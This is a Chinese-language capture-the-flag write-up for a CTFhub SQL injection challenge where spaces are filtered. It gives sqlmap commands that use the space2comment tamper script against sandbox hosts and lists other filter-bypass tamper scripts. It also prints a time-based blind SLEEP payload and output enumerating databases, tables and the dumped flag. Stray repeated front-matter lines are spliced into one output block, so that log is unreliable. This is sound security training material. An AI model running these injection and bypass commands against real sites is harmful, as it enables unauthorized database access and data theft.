---
title: 过滤空格
description: ctfhub过滤空格
tags:
- ctf
- SQL
category: web渗透
draft: false
published: 2024-11-24
---

# 过滤空格

第一步 爆数据库

命令： python sqlmap.py -u "http://challenge-427e4b69b55064d9.sandbox.ctfhub.com:10080/?id=1" --dbs --tamper "space2comment.py"

补充：

脚本名： space2comment.py

作用：Replaces space character  ' '  with comments   //**

也就是用注释/**/替换空格字符' '

sqlmap 中的 tamper 脚本有很多，例如： equaltolike.py （作用是用like代替等号）、 apostrophemask.py （作用是用utf8代替引号）、 greatest.py （作用是绕过过滤'>' ,用GREATEST替换大于号）等。

```shell
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9677 FROM (SELECT(SLEEP(5)))ZfwJ)
tags: [web渗透]
title: 过滤空格
title: 过滤空格
title: 过滤空格
tags: [web渗透]
title: 过滤空格
tags: [web渗透]
---
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli
Database: sqli
[2 tables]
+------------+
| braoolkycm |
| news       |
+------------+
Database: sqli
Table: braoolkycm
[1 column]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| inybzfejkt | varchar(100) |
+------------+--------------+
sqlmap -u http://challenge-3de719b11fcb3158.sandbox.ctfhub.com:10800/?id=1 --tamper "space2comment.py" -D sqli -T braoolkycm -C inybzfejkt --dump --thread 10
```

--thread多线程

```shell
Database: sqli
Table: braoolkycm
[1 entry]
+----------------------------------+
| inybzfejkt                       |
+----------------------------------+
| ctfhub{0691522132f19a6c0aeff1d7} |
+----------------------------------+
```
